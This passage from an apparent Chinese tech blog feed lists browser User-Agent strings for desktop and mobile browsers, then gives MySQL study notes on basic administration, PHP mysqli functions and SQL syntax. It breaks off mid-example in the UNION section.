class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0</span><br><span class="line">Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10</span><br></pre></td></tr></table></figure><h3 id="Safari"><a href="#Safari" class="headerlink" title="Safari"></a>Safari</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2</span><br></pre></td></tr></table></figure><h3 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36</span><br><span class="line">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16</span><br></pre></td></tr></table></figure><h3 id="360"><a href="#360" class="headerlink" title="360"></a>360</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br></pre></td></tr></table></figure><h3 id="淘宝浏览器"><a href="#淘宝浏览器" class="headerlink" title="淘宝浏览器"></a>淘宝浏览器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11</span><br></pre></td></tr></table></figure><h3 id="猎豹浏览器"><a href="#猎豹浏览器" class="headerlink" title="猎豹浏览器"></a>猎豹浏览器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span><br></pre></td></tr></table></figure><h3 id="QQ浏览器"><a href="#QQ浏览器" class="headerlink" title="QQ浏览器"></a>QQ浏览器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)</span><br></pre></td></tr></table></figure><h3 id="sogou浏览器"><a href="#sogou浏览器" class="headerlink" title="sogou浏览器"></a>sogou浏览器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)</span><br></pre></td></tr></table></figure><h3 id="maxthon浏览器"><a href="#maxthon浏览器" class="headerlink" title="maxthon浏览器"></a>maxthon浏览器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36</span><br></pre></td></tr></table></figure><h3 id="UC浏览器"><a href="#UC浏览器" class="headerlink" title="UC浏览器"></a>UC浏览器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36</span><br></pre></td></tr></table></figure><h2 id="移动浏览器大全"><a href="#移动浏览器大全" class="headerlink" title="移动浏览器大全"></a>移动浏览器大全</h2><h3 id="IPhone"><a href="#IPhone" class="headerlink" title="IPhone"></a>IPhone</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br></pre></td></tr></table></figure><h3 id="IPod"><a href="#IPod" class="headerlink" title="IPod"></a>IPod</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br></pre></td></tr></table></figure><h3 id="IPAD"><a href="#IPAD" class="headerlink" title="IPAD"></a>IPAD</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5</span><br><span class="line">Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5</span><br></pre></td></tr></table></figure><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 2.2.1; zh-cn; HTC_Wildfire_A3333 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br><span class="line">Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br></pre></td></tr></table></figure><h3 id="QQ浏览器-Android版本"><a href="#QQ浏览器-Android版本" class="headerlink" title="QQ浏览器 Android版本"></a>QQ浏览器 Android版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1</span><br></pre></td></tr></table></figure><h3 id="Android-Opera-Mobile"><a href="#Android-Opera-Mobile" class="headerlink" title="Android Opera Mobile"></a>Android Opera Mobile</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10</span><br></pre></td></tr></table></figure><h3 id="Android-Pad-Moto-Xoom"><a href="#Android-Pad-Moto-Xoom" class="headerlink" title="Android Pad Moto Xoom"></a>Android Pad Moto Xoom</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13</span><br></pre></td></tr></table></figure><h3 id="BlackBerry"><a href="#BlackBerry" class="headerlink" title="BlackBerry"></a>BlackBerry</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+</span><br></pre></td></tr></table></figure><h3 id="WebOS-HP-Touchpad"><a href="#WebOS-HP-Touchpad" class="headerlink" title="WebOS HP Touchpad"></a>WebOS HP Touchpad</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0</span><br></pre></td></tr></table></figure><h3 id="Nokia-N97"><a href="#Nokia-N97" class="headerlink" title="Nokia N97"></a>Nokia N97</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/20.0.019; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.18124</span><br></pre></td></tr></table></figure><h3 id="Windows-Phone-Mango"><a href="#Windows-Phone-Mango" class="headerlink" title="Windows Phone Mango"></a>Windows Phone Mango</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; HTC; Titan)</span><br></pre></td></tr></table></figure><h3 id="UC浏览器-Mobile"><a href="#UC浏览器-Mobile" class="headerlink" title="UC浏览器_Mobile"></a>UC浏览器_Mobile</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UCWEB7.0.2.37/28/999</span><br><span class="line">NOKIA5700/ UCWEB7.0.2.37/28/999</span><br></pre></td></tr></table></figure><h3 id="UCOpenwave"><a href="#UCOpenwave" class="headerlink" title="UCOpenwave"></a>UCOpenwave</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Openwave&#x2F; UCWEB7.0.2.37&#x2F;28&#x2F;999</span><br></pre></td></tr></table></figure><h3 id="UC-Opera"><a href="#UC-Opera" class="headerlink" title="UC Opera"></a>UC Opera</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/70399115a8f0" target="_blank" rel="noopener">简书</a><br><a href="https://blog.csdn.net/u012175089/article/details/61199238" target="_blank" rel="noopener">CSDN</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习笔记</title>
      <link href="/2020/04/23/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/04/23/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>关系型数据库</strong>(RDBMS) 术语:</p><ul><li>冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li>主键：<font color=orangered>主键是唯一的</font>。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li><li>外键：外键用于关联两个表。</li><li>复合键：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li><li>索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li>参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</li></ul><p>注：</p><ul><li>MAMP中的mysql密码（默认root - root）和自行安装的mysql密码不同。</li><li>MySQL 的SQL语句以分号 (;) 作为结束标识。</li></ul><a id="more"></a><h3 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h3><p>检查MySQL服务器是否启动：<code>ps -ef | grep mysqld</code><br>关闭目前运行的 MySQL 服务器：<code>mysqladmin -u root -p shutdown</code></p><p>在 MySQL5.7 中 <code>user</code> 表的 <code>password</code> 已换成了<code>authentication_string</code>。<br>注意需要执行 <code>FLUSH PRIVILEGES</code> 语句。 这个命令执行后会重新载入授权表。</p><p>添加用户的两种方法：</p><ol><li>在 mysql 数据库中的 user 表添加新用户。</li><li>通过SQL的 GRANT 命令。</li></ol><h3 id="管理MySQL的命令"><a href="#管理MySQL的命令" class="headerlink" title="管理MySQL的命令"></a>管理MySQL的命令</h3><ul><li><p><code>USE 数据库名;</code> 选择要操作的Mysql数据库。</p></li><li><p><code>SHOW DATABASES;</code> 列出 MySQL 数据库管理系统的数据库列表。</p></li><li><p><code>SHOW TABLES;</code> 显示指定数据库的所有表，使用该命令前需要使用 use 命令来选择要操作的数据库。</p></li><li><p><code>SHOW COLUMNS FROM 数据表;</code> 显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。</p></li><li><p><code>SHOW INDEX FROM 数据表;</code> 显示数据表的详细索引信息，包括PRIMARY KEY（主键）。</p></li><li><p><code>SHOW TABLE STATUS LIKE [FROM db_name] [LIKE &#39;pattern&#39;] \G;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW TABLE STATUS  FROM RUNOOB;   # 显示数据库 RUNOOB 中所有表的信息</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW TABLE STATUS from RUNOOB LIKE &#39;runoob%&#39;;     # 表名以runoob开头的表的信息</span><br><span class="line">mysql&gt; SHOW TABLE STATUS from RUNOOB LIKE &#39;runoob%&#39;\G;   # 加上 \G，查询结果按列打印</span><br></pre></td></tr></table></figure></li></ul><h2 id="MySQL-语法"><a href="#MySQL-语法" class="headerlink" title="MySQL 语法"></a>MySQL 语法</h2><h3 id="使用-PHP-脚本连接-MySQL"><a href="#使用-PHP-脚本连接-MySQL" class="headerlink" title="使用 PHP 脚本连接 MySQL"></a>使用 PHP 脚本连接 MySQL</h3><p><code>mysqli_connect()</code> 函数在成功链接到 MySQL 后返回连接标识，失败返回 FALSE 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysqli_connect(host,username,password,dbname,port,socket);</span><br></pre></td></tr></table></figure><ul><li>host 可选。规定主机名或 IP 地址。</li><li>username 可选。规定 MySQL 用户名。</li><li>password 可选。规定 MySQL 密码。</li><li>dbname 可选。规定默认使用的数据库。</li><li>port 可选。规定尝试连接到 MySQL 服务器的端口号。</li><li>socket 可选。规定 socket 或要使用的已命名 pipe。</li></ul><p>可以使用 PHP 的 <code>mysqli_close()</code> 函数来断开与 MySQL 数据库的链接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool mysqli_close ( mysqli $link )</span><br></pre></td></tr></table></figure><h3 id="使用-PHP脚本执行SQL"><a href="#使用-PHP脚本执行SQL" class="headerlink" title="使用 PHP脚本执行SQL"></a>使用 PHP脚本执行SQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure><ul><li>connection 必需。规定要使用的 MySQL 连接。</li><li>query 必需，规定查询字符串。</li><li>resultmode 可选。一个常量。可以是下列值中的任意一个：<ul><li>MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）</li><li>MYSQLI_STORE_RESULT（默认）</li></ul></li></ul><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>可以使用 mysql <code>mysqladmin</code> 命令来创建数据库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u root -p create 数据库名</span><br></pre></td></tr></table></figure><h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><p>可以使用 mysql <code>mysqladmin</code> 命令来创建数据库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u root -p drop 数据库名</span><br></pre></td></tr></table></figure><h3 id="选择MySQL数据库"><a href="#选择MySQL数据库" class="headerlink" title="选择MySQL数据库"></a>选择MySQL数据库</h3><p>PHP 提供了函数 <code>mysqli_select_db</code> 来选取一个数据库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_select_db(connection,dbname);</span><br></pre></td></tr></table></figure><h3 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h3><p>创建MySQL数据表需要以下信息：表名、表字段名、定义每个表字段。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`runoob_tbl`</span>(</span><br><span class="line">   <span class="string">`runoob_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> AUTO_INCREMENT,</span><br><span class="line">   <span class="string">`runoob_title`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">`runoob_author`</span> <span class="built_in">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   <span class="string">`submission_date`</span> <span class="built_in">DATE</span>,</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> ( <span class="string">`runoob_id`</span> )</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name ;</span><br></pre></td></tr></table></figure><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name ( field1, field2,...fieldN )</span><br><span class="line">                        <span class="keyword">VALUES</span></span><br><span class="line">                        ( value1, value2,...valueN );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; <span class="keyword">VALUES</span></span><br><span class="line">    -&gt; (<span class="string">"学习 MySQL"</span>, <span class="string">"菜鸟教程"</span>, <span class="keyword">NOW</span>());</span><br></pre></td></tr></table></figure><p>读取数据表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> runoob_tbl;</span><br></pre></td></tr></table></figure><p>PHP中，对于含有中文的数据插入，需要添加 <code>mysqli_query($conn , &quot;set names utf8&quot;);</code> 语句。</p><h2 id="SQL-查询数据"><a href="#SQL-查询数据" class="headerlink" title="SQL 查询数据"></a>SQL 查询数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br><span class="line">[<span class="keyword">LIMIT</span> N][ <span class="keyword">OFFSET</span> M]</span><br></pre></td></tr></table></figure><p>使用 PHP 函数的 <code>mysqli_query()</code> 及 <code>SQL SELECT</code> 命令来获取数据。该函数用于执行 SQL 命令，然后通过 PHP 函数 <code>mysqli_fetch_array()</code> 来使用或输出所有查询的数据。</p><p><code>mysqli_fetch_array()</code> 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><h3 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a>WHERE 子句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line">[<span class="keyword">WHERE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] condition2.....</span><br></pre></td></tr></table></figure><p>MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 <code>BINARY</code> 关键字来设定 WHERE 子句的字符串比较是区分大小写的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> <span class="built_in">BINARY</span> runoob_author=<span class="string">'runoob.com'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> <span class="built_in">BINARY</span> runoob_author=<span class="string">'RUNOOB.COM'</span>;</span><br></pre></td></tr></table></figure><h3 id="UPDATE-更新"><a href="#UPDATE-更新" class="headerlink" title="UPDATE 更新"></a>UPDATE 更新</h3><p>可以同时更新一个或多个字段，可以同时更新一个或多个字段。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> field1=<span class="keyword">new</span>-value1, field2=<span class="keyword">new</span>-value2</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure><h3 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name [<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure><p>注：如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。</p><h3 id="LIKE-子句"><a href="#LIKE-子句" class="headerlink" title="LIKE 子句"></a>LIKE 子句</h3><p>SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号 *，如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> field1 <span class="keyword">LIKE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] filed2 = <span class="string">'somevalue'</span></span><br></pre></td></tr></table></figure><p>实例：从 runoob_tbl 表中获取 runoob_author 字段中以 COM 为结尾的的所有记录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl  <span class="keyword">WHERE</span> runoob_author <span class="keyword">LIKE</span> <span class="string">'%COM'</span>;</span><br></pre></td></tr></table></figure><p>like 匹配/模糊匹配，会与 % 和 _ 结合使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">'%a'     //以a结尾的数据</span><br><span class="line">'a%'     //以a开头的数据</span><br><span class="line">'%a%'    //含有a的数据</span><br><span class="line">'_a_'    //三位且中间字母是a的</span><br><span class="line">'_a'     //两位且结尾字母是a的</span><br><span class="line">'a_'     //两位且开头字母是a的</span><br><span class="line"></span><br><span class="line">查询以 java 字段开头的信息。</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">position</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'java%'</span>;</span><br><span class="line">查询包含 java 字段的信息。</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">position</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'%java%'</span>;</span><br><span class="line">查询以 java 字段结尾的信息。</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">position</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'%java'</span>;</span><br></pre></td></tr></table></figure><p>在 where like 的条件查询中，SQL 提供了四种匹配方式。</p><ul><li><code>%</code>：表示任意 0 个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示。</li><li><code>_</code>：表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句。</li><li><code>[]</code>：表示括号内所列字符中的一个（类似正则表达式）。指定一个字符、字符串或范围，要求所匹配对象为它们中的任一个。</li><li><code>[^]</code> ：表示不在括号所列之内的单个字符。其取值和 [] 相同，但它要求所匹配对象为指定字符以外的任一个字符。</li><li>查询内容包含通配符时,由于通配符的缘故，导致我们查询特殊字符 <code>“%”、“_”、“[”</code> 的语句无法正常实现，而把特殊字符用 “[ ]” 括起便可正常查询。</li></ul><h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h3><p>UNION 操作符用于<font color=orangered>连接两个以上的 SELECT 语句的结果组合到一个结果集合中</font>。多个 SELECT 语句会<em>删除重复的数据</em>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> 